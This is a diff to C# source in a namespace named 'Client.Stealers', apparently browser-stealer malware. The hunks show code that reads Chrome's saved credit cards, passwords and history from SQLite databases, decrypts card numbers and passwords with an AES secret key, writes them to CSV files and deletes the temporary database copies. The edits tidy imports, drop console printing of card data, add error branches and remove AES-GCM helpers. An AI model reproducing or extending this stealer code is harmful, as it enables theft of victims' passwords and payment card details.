@@ -1,10 +1,11 @@
-﻿using System.Text;
-using System.Security.Cryptography;
-using System.Runtime.InteropServices;
-using Newtonsoft.Json.Linq;
-using System.Data.SQLite;
-using System.Text.RegularExpressions;
+﻿using System.Data.SQLite;
 using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Runtime.Intrinsics.X86;
+using System.Security.Cryptography;
+using System.Text;
+using System.Text.RegularExpressions;
+using Newtonsoft.Json.Linq;
 
 namespace Client.Stealers
 {
@@ -69,9 +70,6 @@ namespace Client.Stealers
                                             {
                                                 // (3) Use AES algorithm to decrypt the card number
                                                 string decryptedCardNumber = DecryptPassword(encryptedCardNumber, secretKey);
-                                                Console.WriteLine($"Sequence: {index}");
-                                                Console.WriteLine($"Card Number: {decryptedCardNumber}\nName on Card: {nameOnCard}\nExpiration Month: {expirationMonth}\nExpiration Year: {expirationYear}\n");
-                                                Console.WriteLine(new string('*', 50));
 
                                                 // (5) Save into CSV 
                                                 decryptedCCs.WriteLine($"{index},{decryptedCardNumber},{nameOnCard},{expirationMonth},{expirationYear}");
@@ -81,6 +79,9 @@ namespace Client.Stealers
                                     }
 
                                     conn.Close();
+                                }
+                                else { 
+                                    decryptedCCs.WriteLine("Error: Unable to retrieve secret key or database connection.");
                                 }
                             }
                             // Delete temp login db
@@ -140,6 +141,11 @@ namespace Client.Stealers
                                             }
                                         }
                                     }
+                                    conn.Close();
+                                }
+                                else
+                                {
+                                    decryptedPasswords.WriteLine("Error: Unable to retrieve secret key or database connection.");
                                 }
                             }
                             // Delete temp login db
@@ -153,7 +159,6 @@ namespace Client.Stealers
                 Debug.WriteLine($"[ERR] {e.ToString()}");
             }
         }
-
         public static void getChromeHistory() 
         {
             try
@@ -194,6 +199,11 @@ namespace Client.Stealers
                                             }
                                         }
                                     }
+                                    conn.Close();
+                                }
+                                else
+                                {
+                                    historyFile.WriteLine("Error: Unable to retrieve secret key or database connection.");
                                 }
                             }
                             // Delete temp history db
@@ -269,17 +279,7 @@ namespace Client.Stealers
             }
         }
 
-        public static byte[] DecryptPayload(AesGcm cipher, byte[] payload, byte[] tag)
-        {
-            byte[] decryptedData = new byte[payload.Length];
-            cipher.Decrypt(new byte[0], payload, tag, decryptedData, new byte[0]);
-            return decryptedData;
-        }
-
-        public static AesGcm GenerateCipher(byte[] aesKey, byte[] iv)
-        {
-            return new AesGcm(aesKey);
-        }
+       
 
         public static string DecryptPassword(byte[] ciphertext, byte[] secretKey)
         {
